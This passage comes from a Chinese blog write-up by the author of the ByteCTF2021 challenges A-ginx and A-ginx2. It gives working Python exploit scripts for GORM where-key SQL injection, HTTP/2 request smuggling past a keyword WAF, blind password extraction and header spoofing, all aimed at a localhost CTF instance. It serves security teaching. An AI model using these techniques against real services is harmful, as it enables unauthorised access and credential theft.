chars:</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">                    <span class="keyword">for</span> d <span class="keyword">in</span> chars:</span><br><span class="line">                        xxxx = <span class="string">f&#x27;<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span><span class="subst">&#123;c&#125;</span><span class="subst">&#123;d&#125;</span>&#x27;</span></span><br><span class="line">                        <span class="keyword">if</span> sha256(xxxx.encode() + suffix).hexdigest() == <span class="built_in">hash</span>:</span><br><span class="line">                            <span class="keyword">return</span> xxxx</span><br><span class="line"></span><br><span class="line">io.sendline(solve_pow(suffix, <span class="built_in">hash</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="A-ginx2"><a href="#A-ginx2" class="headerlink" title="A-ginx2"></a>A-ginx2</h2><h3 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h3><p>要获取管理员的密码，唯一可能就是注入了，其实没什么数据库交互点，可以看到有个query参数很奇怪，里面给的是json的k-v的形式，如果有写过gorm，那么你一定知道，GORM中where可以传入<code>*map[string]interface&#123;&#125;</code> ，其中key可控的情况就会造成SQLi</p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/img/loading.gif" data-original="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713093.png"></p><p>通过简单的尝试，可以获取到SQLi。</p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/img/loading.gif" data-original="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713094.png"></p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/img/loading.gif" data-original="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713095.png"></p><p>以上两个payload可以简单的确认，这里存在注入。</p><p>但是，存在对参数的WAF，需要如何绕过呢？是的。请求走私。</p><h3 id="绕WAF-amp-获取密码"><a href="#绕WAF-amp-获取密码" class="headerlink" title="绕WAF &amp; 获取密码"></a>绕WAF &amp; 获取密码</h3><p>代码中只对参数进行检测，所以，只要走私到body，就可以绕过这个WAF啦！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">DOMAIN = <span class="string">&#x27;127.0.0.1:30443&#x27;</span></span><br><span class="line">Authorization = <span class="string">&#x27;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDAwMDEyMjMsInVzZXJuYW1lIjoia3VyNGdlIn0.Ml09NIlcP5dmiYM0rF09jbvYS3EiT7_EPUgz1Ue4tu0&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span> : <span class="string">&#x27;0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">payload</span>):</span><br><span class="line">    query = parse.quote(json.dumps(&#123;<span class="string">f&quot;title` OR (SELECT 1 FROM users WHERE username=&#x27;admin&#x27; AND <span class="subst">&#123;payload&#125;</span>) OR `title&quot;</span>:<span class="string">&quot;n0t_Exsit&quot;</span>&#125;))</span><br><span class="line">        </span><br><span class="line">    data = <span class="string">f&#x27;&#x27;&#x27;GET /v/articles?pageNum=0&amp;pageSize=36&amp;query=<span class="subst">&#123;query&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost</span></span><br><span class="line"><span class="string">Connection: Keep-Alive</span></span><br><span class="line"><span class="string">Authorization: <span class="subst">&#123;Authorization&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> httpx.Client(http2=<span class="literal">True</span>, verify=<span class="literal">False</span>) <span class="keyword">as</span> client:</span><br><span class="line">        r = client.request(<span class="string">&quot;GET&quot;</span>, <span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/&#x27;</span>, headers=headers, data=data)</span><br><span class="line">        r = client.request(<span class="string">&quot;GET&quot;</span>, <span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        obj = json.loads(r.text)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(obj[<span class="string">&#x27;articles&#x27;</span>]) != <span class="number">0</span></span><br><span class="line"></span><br><span class="line">base_sql = <span class="string">&#x27;ASCII(SUBSTR(password,&#123;&#125;,1))&gt;&#123;&#125;&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">29</span>):</span><br><span class="line">    Min = <span class="number">0x10</span></span><br><span class="line">    Max = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">abs</span>(Max - Min) &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min) // <span class="number">2</span></span><br><span class="line">        payload = base_sql.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    password += <span class="built_in">chr</span>(Max)</span><br><span class="line">    <span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure><p>写出布尔注的脚本，简简单单可以跑到密码<code>Visit_/flag_to_get_the_flag!</code></p><p>但是，<code>/flag</code> 是需要内网ip才能访问。本题没有ssrf，没有xss bot。考虑常见的XFF Payload发现无效，只能来获取真正的XFF头。</p><h3 id="获取IP-Header"><a href="#获取IP-Header" class="headerlink" title="获取IP Header"></a>获取IP Header</h3><p>来获取返回头，需要一个能够返回请求中Query的API。<code>/v/articles/preview</code> 这个API 就可以完成这个能力。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">DOMAIN = <span class="string">&#x27;127.0.0.1:30443&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_header</span>():</span><br><span class="line">    data = <span class="string">&#x27;title=1&amp;content=&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span> : <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span> : <span class="built_in">str</span>(<span class="built_in">len</span>(data) + <span class="number">300</span>),</span><br><span class="line">    &#125;</span><br><span class="line">    first = <span class="string">&#x27;&#x27;&#x27;GET /v/ HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost</span></span><br><span class="line"><span class="string">Connection: Keep-Alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> httpx.Client(http2=<span class="literal">True</span>, verify=<span class="literal">False</span>) <span class="keyword">as</span> client:</span><br><span class="line">        r = client.request(<span class="string">&quot;GET&quot;</span>, <span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/&#x27;</span>, headers=&#123;<span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;0&#x27;</span>&#125;, data=first)</span><br><span class="line">        r = client.request(<span class="string">&quot;POST&quot;</span>, <span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/articles/preview&#x27;</span>, headers=headers, data=data)</span><br><span class="line">        r = client.request(<span class="string">&quot;POST&quot;</span>, <span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/&#x27;</span>, data=<span class="string">&#x27;a&#x27;</span>*<span class="number">400</span>)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">get_header()</span><br></pre></td></tr></table></figure><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/img/loading.gif" data-original="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713096.png"></p><p>拿到Client获取信任IP的header 为 <code>X-Sup3r-DiAnA-Re4l-Ip</code></p><h3 id="Get-flag"><a href="#Get-flag" class="headerlink" title="Get flag"></a>Get flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">DOMAIN = <span class="string">&#x27;127.0.0.1:30443&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username, password</span>):</span><br><span class="line">    <span class="keyword">with</span> httpx.Client(http2=<span class="literal">True</span>, verify=<span class="literal">False</span>) <span class="keyword">as</span> client:</span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">        r = client.post(<span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/login&#x27;</span>, json=data)</span><br><span class="line">        <span class="keyword">return</span> json.loads(r.text)[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">token, header</span>):</span><br><span class="line">    data = <span class="string">f&#x27;&#x27;&#x27;GET /flag HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost</span></span><br><span class="line"><span class="string"><span class="subst">&#123;header&#125;</span>: 172.16.0.1:23333</span></span><br><span class="line"><span class="string">Authorization: Bearer <span class="subst">&#123;token&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> httpx.Client(http2=<span class="literal">True</span>, verify=<span class="literal">False</span>) <span class="keyword">as</span> client:</span><br><span class="line">        r = client.request(<span class="string">&quot;GET&quot;</span>, <span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/&#x27;</span>, headers=&#123;<span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;0&#x27;</span>&#125;, data=data)</span><br><span class="line">        r = client.request(<span class="string">&quot;GET&quot;</span>, <span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/flag&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">return</span> json.loads(r.text)[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line"></span><br><span class="line">token = login(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;Visit_/flag_to_get_the_flag!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line">flag = get_flag(token, <span class="string">&#x27;X-Sup3r-DiAnA-Re4l-Ip&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/img/loading.gif" data-original="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713107.png"></p><h1 id="为了出题而出题-x2F-偷懒的地方"><a href="#为了出题而出题-x2F-偷懒的地方" class="headerlink" title="为了出题而出题&#x2F;偷懒的地方"></a>为了出题而出题&#x2F;偷懒的地方</h1><p>虽然说了那么多命题要义，但最终还是有些问题，不得不用trick来解决。</p><div align="center"><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/img/loading.gif" data-original="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713108.gif?x-oss-process=style/w200"></p></div><h2 id="“迫真”的缓存cache"><a href="#“迫真”的缓存cache" class="headerlink" title="“迫真”的缓存cache"></a>“迫真”的缓存cache</h2><p><a target="_blank" rel="noopener" href="https://github.com/kur4ge/my-ctf-challenges/blob/b287a994400fdd4c28d25e20c78f6c49b46a942e/ByteCTF2021/A-ginx/a-ginx/cmd/server/main.go#L42-L55">ByteCTF2021&#x2F;A-ginx&#x2F;a-ginx&#x2F;cmd&#x2F;server&#x2F;main.go#L42-L55</a></p><p>按照正常逻辑应该不需要这种诡异的判断，但是还是考虑到避免搅屎，加上了这段判断。</p><h2 id="backend使用中间件来完成-跳转"><a href="#backend使用中间件来完成-跳转" class="headerlink" title="backend使用中间件来完成../跳转"></a>backend使用中间件来完成<code>../</code>跳转</h2><p><code>../</code>导致的目录穿越其实是一个很经典的问题，可以看到 <a target="_blank" rel="noopener" href="http://golang.org/x/net/http2">golang.org&#x2F;x&#x2F;net&#x2F;http2</a> 会自动的进行重定向，而 <a target="_blank" rel="noopener" href="http://github.com/gin-gonic/gin">github.com&#x2F;gin-gonic&#x2F;gin</a> 却不能。</p><p><a target="_blank" rel="noopener" href="https://github.com/kur4ge/my-ctf-challenges/blob/6827b69b07f4483d2e9cff9c3f72c69b8146304f/ByteCTF2021/A-ginx2/backend/internal/handler/middleware/uri_trim.go#L13-L33">ByteCTF2021&#x2F;A-ginx2&#x2F;backend&#x2F;internal&#x2F;handler&#x2F;middleware&#x2F;uri_trim.go#L13-L33</a></p><p>为了满足跳转造成的XSS，只能手动写一个中间件了～</p><h2 id="修改源码来允许非法Content-Length"><a href="#修改源码来允许非法Content-Length" class="headerlink" title="修改源码来允许非法Content-Length"></a>修改源码来允许非法Content-Length</h2><p><a target="_blank" rel="noopener" href="https://github.com/kur4ge/my-ctf-challenges/blob/6827b69b07f4483d2e9cff9c3f72c69b8146304f/ByteCTF2021/A-ginx2/Dockerfile_aginx#L16">ByteCTF2021&#x2F;A-ginx2&#x2F;Dockerfile_aginx#L16</a></p><p>A-ginx2 中导致请求走势的注入点为<code>Content-Length</code>，但事实上使用<a target="_blank" rel="noopener" href="http://golang.org/x/net/http2">golang.org&#x2F;x&#x2F;net&#x2F;http2</a>构建的HTTP&#x2F;2服务会针对<code>Content- Length</code>错误抛出一个异常。并且清空body中的数据。所以为了题目的漏洞能够正确的触发，所以只能进行小小的修改了：）</p><h2 id="WAF问题"><a href="#WAF问题" class="headerlink" title="WAF问题"></a>WAF问题</h2><p>WAF就随便写了一个基于关键词WAF，是偷懒了（</p><p>具体的关键词是取自MySQL 8.0 docs中的所有<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/keywords.html#keywords-8-0-detailed-A">keywords</a>，剔除了部分单词，例如or（author），让逻辑可以正确运行。而且，这个waf其实可以用 <code>\u</code>直接绕过（该死的log4j，让我没时间修这个） ，但是似乎，也没人用这个方案绕waf？</p><div align="center"><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/img/loading.gif" data-original="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713109.gif?x-oss-process=style/w200"></p></div><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>希望大家能从这两题中有所收获～</p><div align="center"><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/img/loading.gif" data-original="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-163940277131010.gif"></p></div></div><div class="article-licensing box"><div class="licensing-title"><p>A-ginx 出题思路与题解</p><p><a href="https://blog.kur4ge.com/2021/12/A-ginx-idea-and-writeup/">https://blog.kur4ge.com/2021/12/A-ginx-idea-and-writeup/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Kur4ge</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-12-14</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2022-02-10</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="sharethis-inline-share-buttons"></div><script src="https://platform-api.sharethis.com/js/sharethis.js#property=6173ea868afacc001dd07610&amp;product=inline-share-buttons" defer></script></article></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2022/02/wireguard-tutorial/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">WireGuard 简易上手</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/11/Why-is-Baidu-so-slow/"><span class="level-item">为什么我的百度访问这么慢？？？</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config=function(){this.page.url="https://blog.kur4ge.com/2021/12/A-ginx-idea-and-writeup/",this.page.identifier="2021/12/A-ginx-idea-and-writeup/"};!function(){var e=document,t=e.createElement("script");t.src="//kur4ge.disqus.com/embed.js",t.setAttribute("data-timestamp",+new Date),(e.head||e.body).appendChild(t)}()</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://kur4ge.oss-accelerate.aliyuncs.com/img/avatar.png?no-lazy" alt="Kur4ge"></figure><p class="title is-size-4 is-block" style="line-height:inherit">Kur4ge</p><p class="is-size-6 is-block">Security researcher</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">3</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">10</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://twitter.com/kur4ge1337" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/kur4ge"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/kur4ge1337"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><ul class="menu-list"><li><a class="level is-mobile" href="#检查手牌"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">检查手牌</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#1-HTTP-x2F-2"><span class="level-left"><span class="level-item">1.1.1</span><span class="level-item">1. HTTP/2</span></span></a></li><li><a class="level is-mobile" href="#2-架构带来的风险"><span class="level-left"><span class="level-item">1.1.2</span><span class="level-item">2. 架构带来的风险</span></span></a></li><li><a class="level is-mobile" href="#3-GORM-Where-Key注入"><span class="level-left"><span class="level-item">1.1.3</span><span class="level-item">3. GORM Where Key注入</span></span></a></li><li><a class="level is-mobile" href="#4-简简单单来个XSS"><span class="level-left"><span class="level-item">1.1.4</span><span class="level-item">4. 简简单单来个XSS</span></span></a></li></ul></li><li><a class="level is-mobile" href="#整理手牌"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">整理手牌</span></span></a></li></ul><li><a class="level is-mobile" href="#题目源码与环境"><span class="level-left"><span class="level-item">2</span><span class="level-item">题目源码与环境</span></span></a></li><li><a class="level is-mobile" href="#解题思路和EXP"><span class="level-left"><span class="level-item">3</span><span class="level-item">解题思路和EXP</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#通用的设定"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">通用的设定</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Trace-Id"><span class="level-left"><span class="level-item">3.1.1</span><span class="level-item">Trace-Id</span></span></a></li></ul></li><li><a class="level is-mobile" href="#A-ginx"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">A-ginx</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#XSS"><span class="level-left"><span class="level-item">3.2.1</span><span class="level-item">XSS</span></span></a></li><li><a class="level is-mobile" href="#缓存服务"><span class="level-left"><span class="level-item">3.2.2</span><span class="level-item">缓存服务</span></span></a></li><li><a class="level is-mobile" href="#CRLF注入"><span class="level-left"><span class="level-item">3.2.3</span><span class="level-item">CRLF注入</span></span></a></li><li><a class="level is-mobile" href="#确认基本攻击思路"><span class="level-left"><span class="level-item">3.2.4</span><span class="level-item">确认基本攻击思路</span></span></a></li><li><a class="level is-mobile" href="#写入恶意json"><span class="level-left"><span class="level-item">3.2.5</span><span class="level-item">写入恶意json</span></span></a></li><li><a class="level is-mobile" href="#Flag的获取"><span class="level-left"><span class="level-item">3.2.6</span><span class="level-item">Flag的获取</span></span></a></li><li><a class="level is-mobile" href="#EXP"><span class="level-left"><span class="level-item">3.2.7</span><span class="level-item">EXP</span></span></a></li></ul></li><li><a class="level is-mobile" href="#A-ginx2"><span class="level-left"><span class="level-item">3.3</span><span class="level-item">A-ginx2</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#SQLi"><span class="level-left"><span class="level-item">3.3.1</span><span class="level-item">SQLi</span></span></a></li><li><a class="level is-mobile" href="#绕WAF-amp-获取密码"><span class="level-left"><span class="level-item">3.3.2</span><span class="level-item">绕WAF &amp; 获取密码</span></span></a></li><li><a class="level is-mobile" href="#获取IP-Header"><span class="level-left"><span class="level-item">3.3.3</span><span class="level-item">获取IP Header</span></span></a></li><li><a class="level is-mobile" href="#Get-flag"><span class="level-left"><span class="level-item">3.3.4</span><span class="level-item">Get flag</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#为了出题而出题-x2F-偷懒的地方"><span class="level-left"><span class="level-item">4</span><span class="level-item">为了出题而出题/偷懒的地方</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#“迫真”的缓存cache"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">“迫真”的缓存cache</span></span></a></li><li><a class="level is-mobile" href="#backend使用中间件来完成-跳转"><span class="level-left"><span class="level-item">4.2</span><span class="level-item">backend使用中间件来完成../跳转</span></span></a></li><li><a class="level is-mobile" href="#修改源码来允许非法Content-Length"><span class="level-left"><span class="level-item">4.3</span><span class="level-item">修改源码来允许非法Content-Length</span></span></a></li><li><a class="level is-mobile" href="#WAF问题"><span class="level-left"><span class="level-item">4.4</span><span class="level-item">WAF问题</span></span></a></li></ul></li><li><a class="level is-mobile" href="#最后"><span class="level-left"><span class="level-item">5</span><span class="level-item">最后</span></span></a></li></ul></div></div><style>#toc .menu-list>li>a.is-active+.menu-list{display:block}#toc .menu-list>li>a+.menu-list{display:none}</style><script src="https://kur4ge.oss-accelerate.aliyuncs.com/js/toc.js" defer></script></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%B0%9D%E5%B0%9D%E9%B2%9C/"><span class="level-start"><span class="level-item">尝尝鲜</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%A0%B4%E4%BA%8B%E6%B0%B4/"><span class="level-start"><span class="level-item">破事水</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time datetime="2023-07-15T22:53:49.000Z">2023-07-16</time></p><p class="title"><a href="/2023/07/flexget-plex-and-bangumi/">我的自动化番剧工作流</a></p><p class="categories"><a href="/categories/%E5%B0%9D%E5%B0%9D%E9%B2%9C/">尝尝鲜</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2023-01-27T06:18:47.000Z">2023-01-27</time></p><p class="title"><a href="/2023/01/wireguard-network-link/">Wireguard 组网</a></p><p class="categories"><a href="/categories/%E5%B0%9D%E5%B0%9D%E9%B2%9C/">尝尝鲜</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2022-02-10T23:46:00.000Z">2022-02-11</time></p><p class="title"><a href="/2022/02/wireguard-tutorial/">WireGuard 简易上手</a></p><p class="categories"><a href="/categories/%E5%B0%9D%E5%B0%9D%E9%B2%9C/">尝尝鲜</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2021-12-13T21:37:32.000Z">2021-12-14</time></p><p class="title"><a href="/2021/12/A-ginx-idea-and-writeup/">A-ginx 出题思路与题解</a></p><p class="categories"><a href="/categories/CTF/">CTF</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2021-11-06T14:03:58.000Z">2021-11-06</time></p><p class="title"><a href="/2021/11/Why-is-Baidu-so-slow/">为什么我的百度访问这么慢？？？</a></p><p class="categories"><a href="/categories/%E7%A0%B4%E4%BA%8B%E6%B0%B4/">破事水</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/07/"><span class="level-start"><span class="level-item">七月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/01/"><span class="level-start"><span class="level-item">一月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">二月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">十二月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">十一月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field 